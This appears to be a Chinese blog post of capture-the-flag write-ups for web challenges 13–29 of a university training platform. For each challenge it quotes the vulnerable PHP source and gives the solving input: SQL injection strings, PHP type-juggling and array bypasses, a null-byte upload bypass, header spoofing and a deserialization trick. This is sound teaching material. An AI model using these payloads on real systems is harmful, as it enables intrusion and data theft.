<h2 id="13-COOKIE（200）"><a href="#13-COOKIE（200）" class="headerlink" title="13 .COOKIE（200）"></a><strong>13 .COOKIE（200）</strong></h2><p>TIP:<br>0==not<br>tip很有用哒，0==not，脑补1==yes<br>看样子要修改cookie了，看http报头</p>
<p>OK目的很明确<br>修改cookie<br>有两种方法：</p>
<ol>
<li><p>利用chrome自带的cookie工具</p>
</li>
<li><p>利用burpsuit直接修改</p>
</li>
</ol>
<p>flag:nctf{cookie_is_different_from_session}</p>
<hr>
<h2 id="14-MYSQL（200）"><a href="#14-MYSQL（200）" class="headerlink" title="14.MYSQL（200）"></a><strong>14.MYSQL（200）</strong></h2><p>一上来就给我们科普：robots.txt<br><a href="http://baike.baidu.com/link?url=_4Feorj9kcGoS9ooWZ9w5Ti-rrA0TSZvWuPHQHMwx9BzJlWExmqhIOEwFFwU6tIQpk2GcQ2VTGiw34UOhIUFosvOh4dhrtU_dN0iPWM12ItrtNs95EGjmjk9_Q1RL5Qv" target="_blank" rel="noopener">这里有百科</a></p>
<p>看我robots.txt的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;<span class="comment">//说明id!=1024</span></span><br><span class="line">    $id = intval($_GET[id]);<span class="comment">//这是前面的代码 转为整数</span></span><br><span class="line">   随手输了个id=<span class="number">1024.1</span></span><br><span class="line">   过了</span><br></pre></td></tr></table></figure>
<p>flag is:nctf{query_in_mysql}</p>
<hr>
<h2 id="15-sql-injection-3（200）"><a href="#15-sql-injection-3（200）" class="headerlink" title="15.sql injection 3（200）"></a><strong>15.sql injection 3（200）</strong></h2><p>终于开始了sql注入，等了好久<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">看题！！！</span><br><span class="line"></span><br><span class="line">当我让id=2时，呵呵哒出来了</span><br><span class="line"></span><br><span class="line">title：gbk_sql_injection</span><br><span class="line">gbk宽字节注入的题目，[这里有链接解释宽字节注入](http://www.2cto.com/Article/201301/182881.html)</span><br><span class="line">[还有一个](https://www.91ri.org/8611.html)</span><br><span class="line"></span><br><span class="line">题目中输入id=’ 则会显示成id=’\”很显然’被自动转义了。</span><br><span class="line">这是我们输入id=%df’ or 1=1#</span><br><span class="line"></span><br><span class="line">很显然成功了 ，\没了</span><br><span class="line">发现news数据库里面并没有flag</span><br></pre></td></tr></table></figure></p>
<p>盲打莽撞，发现了个flag数据库（不要问我是怎么知道的，猜的） 直接上union查询<br>URL：<em>index.php?id=%df%27union select **,</em>1 from flag%23<em><br>直接爆出flag<br>再多说一句当输入</em>index.php?id=%df%27union select *<em> </em>from flag%23* 时</p>
<p>ErrorThe used SELECT statements have a different number of columns<br>说明字段不同加个字段试试，<em>index.php?id=%df%27union select **,</em>1 from flag%23*</p>
<p><strong><em>总结</em></strong>：</p>
<p>union查询原则</p>
<ol>
<li>前后的字段数量必须相同</li>
<li>查询出来的字段全是第一个数据表中的字段</li>
<li>第一个数据库有结果集则第二个查询的结果集接在第一个结果集的后面</li>
<li>如果第一个查询没有结果集，则显示的全是第二个查询的结果集</li>
</ol>
<p>才出来： flag：nctf{gbk_3sqli}</p>
<hr>
<h2 id="16-x00（200）"><a href="#16-x00（200）" class="headerlink" title="16./x00（200）"></a><strong>16./x00（200）</strong></h2><p>这题是一道好题！！！</p>
<p>直接就有源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://wiki.jikexueyuan.com/project/php/regular-expression/ereg.html" target="_blank" rel="noopener">ereg详解</a><br><a href="http://www.php.net/manual/zh/function.strpos.php" target="_blank" rel="noopener">strops详解</a><br>这里ereg有两个漏洞</p>
<ol>
<li>%00截断及遇到%00则默认为字符串的结束</li>
<li>当ntf为数组时它的返回值不是FALSE</li>
</ol>
<p>所以有两个方法去攻这道题目<br>1.令id=1%00%23biubiubiu<br>2.令nctf为数组则，nctf[]=111</p>
<p>附加：</p>
<ol>
<li>=== 格式也等</li>
<li>！== （0！==false 为true）</li>
</ol>
<p>最后附上这道题目的答案</p>
<p>flag:nctf{use_00_to_jieduan}</p>
<hr>
<h2 id="17-bypass-again（200）"><a href="#17-bypass-again（200）" class="headerlink" title="17.bypass again（200）"></a><strong>17.bypass again（200）</strong></h2><p>依旧是弱类型<br>看来又是弱类型的php漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$_GET可以接受数组但MD5<br>md5（）不能处理数组结构的数据<br>利用此漏洞构造index.php?a[]=1&amp;b[]=2</p>
<p>Flag: nctf{php_is_so_cool}</p>
<hr>
<h2 id="18-变量覆盖（200）"><a href="#18-变量覆盖（200）" class="headerlink" title="18.变量覆盖（200）"></a><strong>18.变量覆盖（200）</strong></h2><p>直接见代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">     <span class="meta">&lt;?php</span></span><br><span class="line">       extract($_POST);</span><br><span class="line">       <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">           &lt;div class="alert alert-success"&gt;</span><br><span class="line">               &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">           &lt;/div&gt;</span><br><span class="line">       <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">   <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">这里有extract的详解</a><br>总的来说是extract() 函数从数组中将变量导入到当前的符号表。<br>典型的变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">只需要覆盖$pass、$thepassword_123这两个变量使他们相等即可</span><br></pre></td></tr></table></figure>
<p>flag:nctf{bian_liang_fu_gai!}</p>
<hr>
<h2 id="19-PHP是世界上最好的语言（250）"><a href="#19-PHP是世界上最好的语言（250）" class="headerlink" title="19.PHP是世界上最好的语言（250）"></a><strong>19.PHP是世界上最好的语言（250）</strong></h2><p>看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>观察一下发现有两个判断条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id]))<span class="comment">//id与hackerDJ不相同</span></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);<span class="comment">//id又经历了一次URL解码</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)<span class="comment">//解码后的id与hackerDJ相同</span></span><br><span class="line"></span><br><span class="line">这下子好办了两次URL加密即可 ，只加密前一个字符</span><br><span class="line">其实url编码就是一个字符ascii码的十六进制。</span><br><span class="line">h的URL编码为%<span class="number">68</span>，在进行一次编码后为%<span class="number">2568</span></span><br><span class="line">则令id=%<span class="number">2568</span>ackerDJ</span><br></pre></td></tr></table></figure>
<p>url :<a href="http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ" target="_blank" rel="noopener">http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ</a><br>flag: nctf{php_is_best_language}</p>
<hr>
<h2 id="20-伪装者（250）"><a href="#20-伪装者（250）" class="headerlink" title="20.伪装者（250）"></a><strong>20.伪装者（250）</strong></h2><p>这题是固定的模式，直接伪造http头有两种方法：</p>
<ul>
<li>Firefox modify headers 插件</li>
</ul>
<ul>
<li><p>直接burpsuit截断添加 x-forwarded-for:127.0.0.1</p>
<p>nctf{happy_http_headers}</p>
</li>
</ul>
<hr>
<h2 id="21-Header（250）"><a href="#21-Header（250）" class="headerlink" title="21.Header（250）"></a><strong>21.Header（250）</strong></h2><p>这题好low<br>直接看报头</p>
<p>flag就在其中<br>nctf{tips_often_hide_here}</p>
<hr>
<h2 id="22-上传绕过（250）"><a href="#22-上传绕过（250）" class="headerlink" title="22.上传绕过（250）"></a><strong>22.上传绕过（250）</strong></h2><p>我首先上传了一个1.jpg文件<br>然后报的提示是这样的</p>
<p>必须是php文件才行啊！</p>
<p>然后就上传1.php文件<br>然后报的提示是这样的</p>
<p>只允许上传 jpg，GIF ，png后缀的文件</p>
<p>这才意识到我要上传.jpg的文件让他识别为.php的文件,怎么才能做到呢？？？<br>看她的第一个错误提示它是<strong><em>怎么识别文件后缀的</em></strong><br>它是根据./uploads目录下的basename进行识别的<br>在我们上传的时候会出现./uploads</p>
<p>尝试着在/uploads/下加个0X00字符截断 先这么写/uploads/1.php<br>然后 filename=”1.jpg”<br>报错如下：</p>
<p>basename为1.php 1.jpg<br>OK<br>下一步就在这里加一个截断/uploads/1.php0x00<br>方法如下：</p>
<ul>
<li><p>用burpsuit 截断</p>
<p>在/uploads/后面加上1.php （这里是空格好标识）</p>
</li>
<li><p>然后打开hex编码寻找空格及20</p>
</li>
<li><p>找到之后将其修改为00 按回车确认<br>此时变为</p>
<p>然后直接提交<br>flag:nctf{welcome_to_hacks_world}</p>
</li>
</ul>
<hr>
<h2 id="23-SQL注入1（300）"><a href="#23-SQL注入1（300）" class="headerlink" title="23.SQL注入1（300）"></a><strong>23.SQL注入1（300）</strong></h2><p>直接看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://www.w3school.com.cn/php/func_string_trim.asp" target="_blank" rel="noopener">这里有trim的详解</a><br>这里起到过滤字符串两端空格的作用,这道题,一个字坑,看见括号了没，我一直没看见··········<br>最简单的注入 和password无关,user=admin ‘)# //注意括号要闭合不然报错 我就是被坑的</p>
<p>flag:nctf{ni_ye_hui_sql?}</p>
<hr>
<h2 id="24-pass-check（300）"><a href="#24-pass-check（300）" class="headerlink" title="24.pass check（300）"></a><strong>24.pass check（300）</strong></h2><p>直接看<strong><em>核心代码</em></strong><br>还有tip:strcmp(array,string)=null=0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>tip一出这题就没有难度了<br>直接传pass个数组形式pass[]=1<br>look</p>
<p>flag:nctf{strcmp_is_n0t_3afe}</p>
<hr>
<h2 id="25-起名字真难（300）"><a href="#25-起名字真难（300）" class="headerlink" title="25.起名字真难（300）"></a><strong>25.起名字真难（300）</strong></h2><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析一下代码要让number == ‘54975581388’，并且number每个字符与’54975581388’都不同，这就没辙了 。<br>想想啊 让两个数相等换个进制呗<br>只能换十六进制了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )<span class="comment">//因为这段代码的限制</span></span><br></pre></td></tr></table></figure>
<p>54975581388==0xccccccccc<br>所以URL：<a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a><br>The flag is:nctf{follow_your_dream}</p>
<hr>
<h2 id="26-密码重置（300）"><a href="#26-密码重置（300）" class="headerlink" title="26.密码重置（300）"></a><strong>26.密码重置（300）</strong></h2><p>首先看URL：<a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D</a><br>user1是什么鬼，我用base64解密之后 哈哈 原来是ctfuser<br>直接上图吧不多说什么了</p>
<hr>
<h2 id="27-php-反序列化（300）"><a href="#27-php-反序列化（300）" class="headerlink" title="27.php 反序列化（300）"></a><strong>27.php 反序列化（300）</strong></h2><p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://blog.csdn.net/21aspnet/article/details/6908318" target="_blank" rel="noopener">这里有序列化反序列化的科普</a><br>总的来说让输一个·序列化过后的字符串并且类中的变量始终保持相同，这一下子就想到了引用 a=&amp;b</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($o-&gt;secret === $o-&gt;enter)</span><br></pre></td></tr></table></figure>
<p>我构造如下代码制造序列化字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">just4fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;enter=&amp;<span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> just4fun());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>OK flag 出来啦</p>
<p>flag: nctf{serialize_and_unserialize}</p>
<hr>
<h2 id="28-sql-injection-4（300）"><a href="#28-sql-injection-4（300）" class="headerlink" title="28.sql injection 4（300）"></a><strong>28.sql injection 4（300）</strong></h2><p>直接看代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p><a href="http://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">科普htmlentities($str, ENT_QUOTES)</a><br>这是一个单引号过滤。我们就没有办法添加单引号闭合了，看来只能运用转义字符吃掉单引号了。怎么吃掉的呢？？</p>
<ul>
<li><p>我在本地搭了一个环境</p>
<p>现在的mysql查询语句变成了SELECT * FROM users WHERE name=’\’ AND pass=’ or 1=1 #’;<br>tip：在mysql查询语句中转义字符不参与闭合 也就是说第二个单引号不参与闭合 第一个单引号和第三个单引号闭合此时<br>name=’\’ AND pass=’<br>然后是下面的 or 1=1<br>结果一下就出来了</p>
<p>flag:nctf{sql_injection_is_interesting}</p>
</li>
</ul>
<hr>
<h2 id="29-综合题（300）"><a href="#29-综合题（300）" class="headerlink" title="29.综合题（300）"></a><strong>29.综合题（300）</strong></h2><p>tip:bash<br>打开一看这是什么啊<a href="http://www.ilrose.com/blog/2015/07/08/jother%E7%BC%96%E7%A0%81/" target="_blank" rel="noopener">jother编码</a><br>chrome console解码得：</p>
<p>1bc29b36f623ba82aaf6724fd3b16718.php<br>直接打开文件</p>
<p>看tip:history of bash<br>上网搜了一下history of bash</p>
<p>/.bash_history 文件<br>于是打开文件</p>
